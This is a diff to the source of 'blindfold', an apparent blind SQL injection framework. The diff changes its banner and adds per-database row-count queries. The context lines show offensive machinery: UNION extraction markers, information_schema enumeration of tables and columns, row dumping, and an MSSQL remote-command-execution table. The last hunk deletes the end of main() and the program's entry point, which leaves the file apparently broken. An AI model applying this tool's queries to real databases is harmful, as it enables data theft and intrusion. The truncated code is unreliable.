@@ -71,14 +71,19 @@ UMARK = "bfUc"                   # UNION column-reflection probe
 ULEFT, URIGHT = "bfUL", "bfUR"   # markers wrapped around a UNION-extracted value
 
 VERSION = "3.6.0"
-BANNER = r"""
-  _     _ _           _  __       _     _
- | |__ | (_)_ __   __| |/ _| ___ | | __| |
- | '_ \| | | '_ \ / _` | |_ / _ \| |/ _` |
- | |_) | | | | | | (_| |  _| (_) | | (_| |
- |_.__/|_|_|_| |_|\__,_|_|  \___/|_|\__,_|   v%s
-        blind SQLi framework  -  created by Hassan Almatar
-""" % VERSION
+_RED, _RESET = "\033[1;31m", "\033[0m"   # bold red
+_ART = r"""
+ ____  _      _____ _   _ _____  ______ ____  _      _____
+|  _ \| |    |_   _| \ | |  __ \|  ____/ __ \| |    |  __ \
+| |_) | |      | | |  \| | |  | | |__ | |  | | |    | |  | |
+|  _ <| |      | | | . ` | |  | |  __|| |  | | |    | |  | |
+| |_) | |____ _| |_| |\  | |__| | |   | |__| | |____| |__| |
+|____/|______|_____|_| \_|_____/|_|    \____/|______|_____/
+"""
+_W = max(len(l) for l in _ART.splitlines())          # banner width
+_SUB = "created by Hassan Almatar".center(_W)         # name centered under it
+_TAG = ("blind SQLi framework  -  v%s" % VERSION).center(_W)
+BANNER = _RED + _ART + _SUB + "\n" + _TAG + _RESET
 
 
 class RequestError(Exception):
@@ -148,7 +153,7 @@ class Dbms:
     def q_columns(self, t):
         return (f"SELECT string_agg(column_name,',') FROM information_schema.columns "
                 f"WHERE table_name={self.quote_str(t)}")
-    def q_count(self, t): return f"SELECT count(*) FROM {self.quote_ident(t)}"
+    def q_count(self, t): return f"SELECT cast(count(*) as text) FROM {self.quote_ident(t)}"
     def concat_cols(self, cols):
         return " || '|' || ".join(f"coalesce(cast({self.quote_ident(c)} as text),'')" for c in cols)
     def q_row(self, t, cols, off):
@@ -219,6 +224,7 @@ class MySQL(Dbms):
     def quote_ident(self, name): return "`" + name.replace("`", "``") + "`"
     def union_wrap(self, qexpr, left, right):
         return f"concat('{left}',({qexpr}),'{right}')"
+    def q_count(self, t): return f"SELECT cast(count(*) as char) FROM {self.quote_ident(t)}"
     def q_current_db(self): return "SELECT database()"
     def q_tables(self):
         return ("SELECT group_concat(table_name) FROM information_schema.tables "
@@ -259,6 +265,7 @@ class MSSQL(Dbms):
         return f"SELECT STRING_AGG(l,CHAR(10)) FROM {RCE_TABLE} WHERE l IS NOT NULL"
     def rce_cleanup(self):
         return [f"IF OBJECT_ID('{RCE_TABLE}') IS NOT NULL DROP TABLE {RCE_TABLE}"]
+    def q_count(self, t): return f"SELECT cast(count(*) as varchar(32)) FROM {self.quote_ident(t)}"
     def q_current_db(self): return "SELECT DB_NAME()"
     def q_tables(self):
         return ("SELECT STRING_AGG(table_name,',') FROM information_schema.tables "
@@ -284,6 +291,7 @@ class Oracle(Dbms):
         if not re.match(r"^[A-Za-z0-9_$#]+$", name):
             raise SystemExit(f"[!] refusing unsafe Oracle identifier: {name!r}")
         return name
+    def q_count(self, t): return f"SELECT to_char(count(*)) FROM {self.quote_ident(t)}"
     def q_current_db(self): return "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual"
     def q_tables(self):
         return "SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables"
@@ -1227,24 +1235,4 @@ def main():
         st = load_state(state_path, sig)
         if st:
             length, value = st.get("length"), st.get("value", "")
-            print(f"[*] resuming: {len(value)}/{length} -> '{value}'")
-    val = extract_search(det.oracle, a, state_path, sig, value, length)
-    if val is None:
-        print("[!] length not found (empty result or bad query)")
-        sys.exit(1)
-    print(f"\n[+] RESULT: {val}\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
-    try:
-        os.remove(state_path)
-    except OSError:
-        pass
-
-
-if __name__ == "__main__":
-    try:
-        main()
-    except RequestError as e:
-        print(f"\n[!] {e}", file=sys.stderr)
-        sys.exit(2)
-    except KeyboardInterrupt:
-        print("\n[!] interrupted", file=sys.stderr)
-        sys.exit(130)
+  
